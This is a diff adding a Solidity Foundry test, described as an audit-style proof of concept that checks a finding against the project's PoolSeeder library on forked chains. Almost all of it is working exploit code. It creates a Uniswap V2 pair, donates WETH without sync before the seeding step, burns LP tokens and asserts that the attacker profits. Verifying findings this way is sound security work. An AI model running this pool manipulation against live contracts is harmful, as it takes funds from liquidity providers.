@@ -1,0 +1,61 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+import {Test, console} from "forge-std/Test.sol";
+import {PoolSeeder} from "../../contracts/libraries/PoolSeeder.sol";
+import {ForkToken, SeedHarness, IRouterV2, IFactoryV2, IPairV2, IWeth9} from "../fork/ForkUniV2.t.sol";
+
+/// PoC verifikasi (bukan bagian repo): donasi WETH tanpa sync terhadap pair Uniswap v2 ASLI di fork.
+contract ForkDonationPoc is Test {
+    address attacker = makeAddr("atk");
+    IFactoryV2 factory; address weth; ForkToken token; IPairV2 pair;
+
+    function _poc(string memory key, address routerAddr, uint256 tokens, uint256 eth, uint256 aTok, uint256 aEth, uint256 don) internal {
+        string memory rpc = vm.envOr(key, string(""));
+        if (bytes(rpc).length == 0) { vm.skip(true); return; }
+        vm.makePersistent(address(PoolSeeder));
+        vm.createSelectFork(rpc);
+        IRouterV2 router = IRouterV2(routerAddr);
+        factory = IFactoryV2(router.factory());
+        weth = router.WETH();
+        token = new ForkToken();
+        SeedHarness h = new SeedHarness();
+
+        token.transfer(attacker, aTok);
+        vm.deal(attacker, aEth + don);
+        vm.startPrank(attacker);
+        pair = IPairV2(factory.createPair(address(token), weth));
+        IWeth9(weth).deposit{value: aEth + don}();
+        IWeth9(weth).transfer(address(pair), aEth);
+        token.transfer(address(pair), aTok);
+        pair.mint(attacker);
+        IWeth9(weth).transfer(address(pair), don); // donasi TANPA sync
+        vm.stopPrank();
+
+        token.transfer(address(h), tokens);
+        vm.deal(address(this), eth);
+        h.seed{value: eth}(address(factory), weth, address(token), tokens, address(0xdEaD));
+
+        _report(tokens, eth, aTok, aEth, don);
+    }
+
+    function _report(uint256 tokens, uint256 eth, uint256 aTok, uint256 aEth, uint256 don) internal {
+        uint256 lp = pair.balanceOf(attacker);
+        vm.startPrank(attacker);
+        pair.transfer(address(pair), lp);
+        (uint256 a0, uint256 a1) = pair.burn(attacker);
+        vm.stopPrank();
+        (uint256 outTok, uint256 outEth) = pair.token0() == address(token) ? (a0, a1) : (a1, a0);
+        uint256 valueIn = aEth + don + (aTok * eth) / tokens;
+        uint256 valueOut = outEth + (outTok * eth) / tokens;
+        console.log("chain", block.chainid);
+        console.log("attacker in  tokens/1e18", aTok / 1e18, "eth wei", aEth + don);
+        console.log("attacker out tokens/1e18", outTok / 1e18, "eth wei", outEth);
+        console.log("attacker value in  (wei @target)", valueIn);
+        console.log("attacker value out (wei @target)", valueOut);
+        assertGt(valueOut, valueIn, "expected profit if finding is real");
+    }
+
+    function test_robinhood_home() public { _poc("FORK_RPC_ROBINHOOD", 0x89e5DB8B5aA49aA85AC63f691524311AEB649eba, 190_000_000 ether, 3.91 ether, 30_000_000 ether, 0.3 ether, 5 ether); }
+    function test_base_remote() public { _poc("FORK_RPC_BASE", 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24, 4_000_000 ether, 0.04 ether, 600_000 ether, 0.003 ether, 0.05 ether); }
+}
